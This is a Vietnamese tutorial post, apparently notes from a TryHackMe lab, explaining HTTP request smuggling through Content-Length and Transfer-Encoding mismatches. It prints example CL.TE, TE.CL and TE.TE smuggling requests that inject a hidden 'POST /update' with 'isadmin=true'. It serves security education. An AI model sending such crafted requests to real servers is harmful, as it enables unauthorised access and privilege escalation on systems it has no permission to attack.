---
title: "HTTP Request Smuggling"
date: "2025-03-01"
excerpt: "HTTP Request Smuggling - Tryhackme"
featured: "/images/http_req_smug.png"
---

## Introduction

HTTP Request Smuggling là một lỗ hổng phát sinh khi có sự không khớp trong các thành phần cơ sở hạ tầng web khác nhau. Điều này bao gồm proxy, bộ cân bằng tải và máy chủ diễn giải ranh giới của các yêu cầu HTTP. Ví dụ, hãy xem xét một nhà ga xe lửa nơi vé được kiểm tra tại nhiều điểm trước khi lên tàu. Nếu mỗi điểm kiểm tra có tiêu chí khác nhau cho một vé hợp lệ, hành khách có thể khai thác những sự không nhất quán này để lên tàu mà không có vé hợp lệ. Tương tự như vậy, trong các yêu cầu web, lỗ hổng này chủ yếu liên quan đến các tiêu đề Content-Length và Transfer-Encoding, biểu thị phần cuối của nội dung yêu cầu. Khi các tiêu đề này bị thao túng hoặc diễn giải không nhất quán giữa các thành phần, điều này có thể dẫn đến việc một request bị lẫn với một request khác.

![image](https://hackmd.io/_uploads/B1n-VDpcyl.png)

Các cuộc tấn công phân tách yêu cầu hoặc HTTP desync có thể xảy ra do bản chất của các kết nối duy trì trạng thái kết nối và đường ống HTTP, cho phép nhiều yêu cầu được gửi qua cùng một kết nối TCP. Nếu không có các cơ chế này, việc chuyển lậu yêu cầu sẽ không khả thi. Khi tính toán kích thước cho Content-Length (CL) và Transfer-Encoding (TE), điều quan trọng là phải xem xét sự hiện diện của các ký tự trả về đầu dòng `\r` và xuống dòng `\n`. Các ký tự này không chỉ là một phần của định dạng giao thức HTTP mà còn ảnh hưởng đến việc tính toán kích thước nội dung.

## Modern Infrastructure

### Components of Modern Web Applications

- Front-end server: thường là proxy ngược hoặc bộ cân bằng tải và chuyển tiếp request tới backend server. 
- Back-end server: Xử lý các request của người dùng, tương tác với database, gửi data tới frontend.
- Databases
- APIs
- Microservices

### Load Balancers and Reverse Proxies
- Load Balancers: Các thiết bị hoặc dịch vụ này phân phối lưu lượng mạng đến nhiều máy chủ để đảm bảo không có máy chủ nào bị quá tải. VD: AWS Elastic Load Balancing, HAProxy và F5 BIG-IP.
- Reverse Proxies: đứng trước một hay nhiều máy chủ web, chuyển tiếp các yêu cầu của máy khách đến máy chủ web thích hợp. Mục đích chính là cung cấp điểm truy cập và kiểm soát duy nhất cho backend server.

![image](https://hackmd.io/_uploads/B1QLdPTckl.png)

### Role of Caching Mechanisms

Caching là một kỹ thuật dùng để lưu trữ và tái sử dụng dữ liệu đã lấy trước đó hoặc kết quả tính toán để tăng tốc các yêu cầu và tính toán tiếp theo. Trong bối cảnh cơ sở hạ tầng web:

- Content Caching: Lưu trữ web content mà nó không thay đổi (ảnh, css, js)
- Database Query Caching: Lưu trữ kết quả câu truy vấn.
- Full-page Caching: lưu trữ toàn bộ trang web.
- Edge Caching/CDNs
- API Caching

## Behind the Scenes

### Understanding HTTP Request Structure

Tất cả các HTTP Request bao gồm 2 phần: header và body.
![image](https://hackmd.io/_uploads/B1bwXjls1e.png)


### Content-Length Header

Content-Length cho ra kích thước (bytes) của request hay response => thông báo cho server có bao nhiêu data sẽ nhận được.

```
POST /submit HTTP/1.1
Host: good.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 14
    
q=smuggledData
```

### Transfer-Encoding Header

Được sử dụng để chỉ định hình thức mã hõa được áp dụng cho phần body. Các giá trị cho header này thường là: chunked, compress, deflate, gzip.

```
POST /submit HTTP/1.1
Host: good.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
    
b
q=smuggledData 
0
```
Trong ví dụ trên, "b" ở dạng hệ thập lục phân => 11 hệ thập phân => size = 11 bytes

### How Headers Affect Request Processing

Headers đóng vai trò quan trọng hướng dẫn server xử lý yêu cầu. Điều này do xác định cách phân tích body và ảnh hưởng đến các hành vi của bộ đệm. Chúng cũng ảnh hưởng đến xác thực, chuyển hướng và các phản hồi của máy chủ khác.

![image](https://hackmd.io/_uploads/HJCrqigi1g.png)

Thao túng các header Content-Length và Transfer-Encoding có thể tạo ra lỗ hổng. Ví dụ, nếu 1 proxy server bị nhầm lẫn bởi các header này => không phân biệt được chính xác nơi một yêu cầu kết thúc và một yêu cầu khác bắt đầu.

### HTTP Request Smuggling Origin

HTTP Request Smuggling xảy ra khi sự khác biệt giữa các server khác nhau (FE, BE) xử lý đường biên.
- Nếu cả Content-Length và Transfer-Encoding, nhầm lẫn có thể xảy ra.
- Một số thành phần ưu tiên CTL, và ngược lại.
- Một số thành phần tưởng request đã kết thúc, các thành phần khác thì vẫn tiếp tục dẫn đến smuggling.

![image](https://hackmd.io/_uploads/HJk0osls1l.png)

## Request Smuggling CL.TE

### Introduction to CL.TE request smuggling

CL.TE viết tắt của Content-Length/Transfer-Encoding. Trong kỹ thuạt này khai thác về sự khác biệt giữa các server giữa thứ tự ưu tiên, ví dụ:
- Proxy sử dụng Content-Length để quyết định phần kết thúc của request.
- Backend server sử dụng phần Transfer-Encoding.

![image](https://hackmd.io/_uploads/HJy6Toej1l.png)

### Exploiting CL.TE for Request Smuggling

Kỹ thuật này, hacker sẽ ghép request bao gồm 2 headers, đảm bảo rằng frontend server và backend server diễn giải các đường biên khác nhau.

```
POST /search HTTP/1.1
Host: example.com
Content-Length: 130
Transfer-Encoding: chunked

0

POST /update HTTP/1.1
Host: example.com
Content-Length: 13
Content-Type: application/x-www-form-urlencoded

isadmin=true
```

Ở đây, frontend server thấy độ dài nội dung là 130 bytes -> kết thúc ở isadmin=true. Trong khí đó, backend server thấy Transfer-Encoding: chunked và diễn giải 0 là kết thúc của một đoạn, làm cho yêu cầu thứ 2 bắt đầu 1 đoạn mới. Điều này có thể dẫn đến máy chủ back-end coi bài đăng /cập nhật HTTP /1.1 là một yêu cầu mới, riêng biệt, có khả năng cung cấp cho kẻ tấn công truy cập trái phép.

## Request Smuggling TE.CL

### Introduction to TE.CL Technique

Khi proxy ưu tiên TE, còn backend ưu tiên CL.

![image](https://hackmd.io/_uploads/SkeFfhgoyl.png)


### Exploiting TE.CL for Request Smuggling

```
POST / HTTP/1.1
Host: example.com
Content-Length: 4
Transfer-Encoding: chunked

78
POST /update HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

isadmin=true
0
```

## Transfer Encoding Obfuscation

Transfer-Encoding/Transfer-Encoding => Cả FE, BE sử dụng TE.

![image](https://hackmd.io/_uploads/SJIX42ljkx.png)

Khai thác đưa về dạng CL.TE hoặc TE.CL

### Exploiting TE.TE for Request Smuggling

Sử dụng TE Header với mã hóa khác nhau.

```
POST / HTTP/1.1
Host: example.com
Content-length: 4
Transfer-Encoding: chunked
Transfer-Encoding: chunked1

4e
POST /update HTTP/1.1
Host: example.com
Content-length: 15

isadmin=true
0
```


